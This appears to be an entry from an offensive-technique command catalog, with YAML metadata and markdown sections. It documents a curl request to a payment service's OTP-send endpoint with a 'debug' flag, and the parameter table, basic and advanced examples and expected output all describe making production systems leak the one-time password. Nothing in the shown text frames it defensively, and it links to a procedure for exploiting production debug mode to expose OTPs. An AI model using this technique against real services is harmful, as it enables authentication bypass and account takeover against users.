---
id: c2e3f4g5-h6i7-8902-efgh-5678901234
data: >-
  curl -X POST https://api.kartpay.com/otp/send -H "Authorization: Bearer
  $ACCESS_TOKEN" -d '{"phone":"$PHONE", "debug":true}'
tags:
  - api-testing
  - debug
  - otp
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:24:39.820Z'
verified: false
validated: true
submitted: true
---
# curl-trigger-otp-debug

## Command

```bash
curl -X POST https://api.kartpay.com/otp/send -H "Authorization: Bearer $ACCESS_TOKEN" -d '{"phone":"$PHONE", "debug":true}'
```

## Description

Triggers OTP generation with a debug flag to expose sensitive details in production environments where debug is enabled.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | HTTP method for OTP request | Yes |
| `-H "Authorization: Bearer $ACCESS_TOKEN"` | Bearer token for auth; replace $ACCESS_TOKEN | Yes |
| `-d '{"phone":"$PHONE", "debug":true}'` | Payload with phone and debug flag | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://api.kartpay.com/otp/send -H "Authorization: Bearer token123" -d '{"phone":"+1234567890", "debug":true}'
```

### Advanced Usage

```bash
curl -X POST https://api.kartpay.com/otp/send -H "Authorization: Bearer token123" -H "Content-Type: application/json" -d '{"phone":"+1234567890", "debug":true, "merchantId":"000"}'
```

## Expected Output

Response like {"otp": "123456", "debug": "OTP generated for phone"}, exposing the OTP.

## Related

- [[Related Procedure: Leverage-Production-Debug-Mode-for-OTP-Exposure]]
